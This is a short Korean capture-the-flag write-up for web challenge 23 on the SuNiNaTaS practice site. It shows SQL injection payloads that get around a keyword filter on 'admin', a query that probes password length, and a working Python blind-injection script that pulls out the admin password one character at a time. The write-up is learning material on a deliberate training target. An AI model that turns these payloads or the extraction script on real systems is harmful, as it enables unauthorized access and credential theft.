# web-23

    22번과 동일한 형태의 SQL injection.
    admin의 비번을 알아내는 것이 목표인데, admin이 필터링 키워드에 추가되었다. 
    그러니까, admin을 쓰지 않고, admin인 것을 알아야 한다. 

## admin으로 로그인하기
- `SELECT * FROM user WHERE id='' AND pw=''`
- id에 `ad'+'min'--`, 을 넣으면 필터링 우회가능.
    - `'or id<'b'--`를 넣어도, admin의 a가 b보다 작기에 참이 되어 로그인이 된다. 

## pw 길이 알아내기
- `ad'+'min' and len(pw)=12--`에서 로그인이 된다.

## pw 내용 알아내기
    import urllib
    import requests

    url = "http://www.suninatas.com/challenge/web23/web23.asp"
    headers = {'Cookie':'ASPSESSIONIDCQTACDCA=JNENOGAACCJMPEDFLCLNPJAC'}
    password = ""

    for i in range(1,13):
        for j in range(33,123):
            query = "?id='or right(left(pw,"+str(i)+"),1)='"+chr(j)+"'--&pw=1004"
            r = requests.get(url+query, headers=headers)
            if r.text.find("color=blue>admin") != -1:
                password += chr(j)
                print ("password is ", password)
                break

>필터링을 피하는 방법, left, right같은 SQL 함수에 대해서 알게 되었다. burpsuite말고, 스크립트로 푸는 방법도 조금 익숙해진 것 같다.